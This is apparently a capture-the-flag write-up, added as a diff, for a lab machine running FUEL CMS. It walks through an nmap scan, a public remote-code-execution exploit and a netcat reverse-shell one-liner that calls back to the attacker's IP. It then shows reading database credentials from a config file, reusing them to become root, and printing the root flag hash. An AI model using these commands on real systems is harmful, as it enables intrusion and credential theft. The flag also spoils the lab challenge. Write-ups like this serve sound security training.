@@ -1,0 +1,262 @@
+1)Recon
+   Tool : nmap 
+   command : sudo nmap -A -T5 -Pn $IP
+Output
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 12:46 IST
+Warning: 10.10.71.107 giving up on port because retransmission cap hit (2).
+Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Parallel DNS resolution of 2 hosts. Timing: About 0.00% done
+Nmap scan report for 10.10.71.107
+Host is up (0.21s latency).
+Not shown: 996 closed ports
+PORT      STATE    SERVICE      VERSION
+80/tcp    open     http         Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+691/tcp   filtered resvc
+3995/tcp  filtered iss-mgmt-ssl
+10001/tcp filtered scp-config
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   206.65 ms 10.8.0.1
+2   206.73 ms 10.10.71.107
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 89.37 seconds
+
+2) EXPLORATION
+ITS A CMS Template let's try to search an exploit in exploit DB
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit fuel cms
+---------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                          |  Path
+---------------------------------------------------------------------------------------- ---------------------------------
+fuel CMS 1.4.1 - Remote Code Execution (1)                                              | linux/webapps/47138.py
+
+
+
+I EDITED THIS EXPLOIT AND MADE IT WORK . OTHERWISE IT WAS SHOWING TON OF ERRORS                                                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ python3 fuelcmsexploit.py
+cmd:whoami
+systemwww-data
+
+<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">
+
+<h4>A PHP Error was encountered</h4>
+
+<p>Severity: Warning</p>
+<p>Message:  preg_match(): Delimiter must not be alphanumeric or backslash</p>
+<p>Filename: controllers/Pages.php(924) : runtime-created function</p>
+<p>Line Number: 1</p>
+
+
+        <p>Backtrace:</p>
+
+
+
+
+
+
+
+
+                        <p style="margin-left:10px">
+                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php(924) : runtime-created function<br />
+                        Line: 1<br />
+                        Function: preg_match                    </p>
+
+
+
+
+
+
+                        <p style="margin-left:10px">
+                        File: /var/www/html/fuel/modules/fuel/controllers/Pages.php<br />
+                        Line: 932<br />
+                        Function: array_filter                  </p>
+
+
+
+
+
+
+                        <p style="margin-left:10px">
+                        File: /var/www/html/index.php<br />
+                        Line: 364<br />
+                        Function: require_once                  </p>
+
+
+
+
+</div>
+cmd:
+
+Gaining access 
+Since it is a rce I can write a nc busybox reverse shell and listen it using my netcat listener
+cmd:rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.131.147 1234 > /tmp/f
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234        
+listening on [any] 1234 ...
+connect to [10.8.131.147] from (UNKNOWN) [10.10.71.107] 42274
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+README.md
+assets
+composer.json
+contributing.md
+fuel
+index.php
+robots.txt
+$ 
+
+Shell spawning
+$ python -c 'import pty ; pty.spawn("/bin/bash");'
+python -c 'import pty ; pty.spawn("/bin/bash");'
+www-data@ubuntu:/var/www/html$ 
+found flag.txt
+
+Privelige escalation 
+using sudo -l but no use again and again prompting for password
+
+using find command for suid bits nothing much 
+
+Enumerating here and there .....
+
+
+www-data@ubuntu:/var/www/html/fuel/application/config$ ls
+ls
+MY_config.php        constants.php      google.php     profiler.php
+MY_fuel.php          custom_fields.php  hooks.php      redirects.php
+MY_fuel_layouts.php  database.php       index.html     routes.php
+MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
+asset.php            editors.php        migration.php  social.php
+autoload.php         environments.php   mimes.php      states.php
+config.php           foreign_chars.php  model.php      user_agents.php
+www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
+cat database.php
+<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+/*
+| -------------------------------------------------------------------
+| DATABASE CONNECTIVITY SETTINGS
+| -------------------------------------------------------------------
+| This file will contain the settings needed to access your database.
+|
+| For complete instructions please consult the 'Database Connection'
+| page of the User Guide.
+|
+| -------------------------------------------------------------------
+| EXPLANATION OF VARIABLES
+| -------------------------------------------------------------------
+|
+|       ['dsn']      The full DSN string describe a connection to the database.
+|       ['hostname'] The hostname of your database server.
+|       ['username'] The username used to connect to the database
+|       ['password'] The password used to connect to the database
+|       ['database'] The name of the database you want to connect to
+|       ['dbdriver'] The database driver. e.g.: mysqli.
+|                       Currently supported:
+|                                cubrid, ibase, mssql, mysql, mysqli, oci8,
+|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
+|       ['dbprefix'] You can add an optional prefix, which will be added
+|                                to the table name when using the  Query Builder class
+|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection
+|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
+|       ['cache_on'] TRUE/FALSE - Enables/disables query caching
+|       ['cachedir'] The path to the folder where cache files should be stored
+|       ['char_set'] The character set used in communicating with the database
+|       ['dbcollat'] The character collation used in communicating with the database
+|                                NOTE: For MySQL and MySQLi databases, this setting is only used
+|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
+|                                (and in table creation queries made with DB Forge).
+|                                There is an incompatibility in PHP with mysql_real_escape_string() which
+|                                can make your site vulnerable to SQL injection if you are using a
+|                                multi-byte character set and are running versions lower than these.
+|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
+|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix
+|       ['encrypt']  Whether or not to use an encrypted connection.
+|
+|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
+|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
+|
+|                               'ssl_key'    - Path to the private key file
+|                               'ssl_cert'   - Path to the public key certificate file
+|                               'ssl_ca'     - Path to the certificate authority file
+|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
+|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
+|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
+|
+|       ['compress'] Whether or not to use client compression (MySQL only)
+|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
+|                                                       - good for ensuring strict SQL while developing
+|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.
+|       ['failover'] array - A array with 0 or more data for connections if the main should fail.
+|       ['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
+|                               NOTE: Disabling this will also effectively disable both
+|                               $this->db->last_query() and profiling of DB queries.
+|                               When you run a query, with this setting set to TRUE (default),
+|                               CodeIgniter will store the SQL statement for debugging purposes.
+|                               However, this may cause high memory usage, especially if you run
+|                               a lot of SQL queries ... disable this to avoid that problem.
+|
+| The $active_group variable lets you choose which connection group to
+| make active.  By default there is only one group (the 'default' group).
+|
+| The $query_builder variables lets you determine whether or not to load
+| the query builder class.
+*/
+$active_group = 'default';
+$query_builder = TRUE;
+
+$db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE
+);
+
+// used for testing purposes
+if (defined('TESTING'))
+{
+        @include(TESTER_PATH.'config/tester_database'.EXT);
+}
+www-data@ubuntu:/var/www/html/fuel/application/config$ 
+
+logging into root
+
+www-data@ubuntu:/var/www/html/fuel/application/config$ su root
+su root
+Password: mememe
+
+root@ubuntu:/var/www/html/fuel/application/config# 
+root@ubuntu:~# cat root.txt
+cat root.txt
+b9bbcb33e11b80be759c4e844862482d 
+root@ubuntu:~# 
+ AND KUDOS MACHINE HAS BEEN PWNED
+
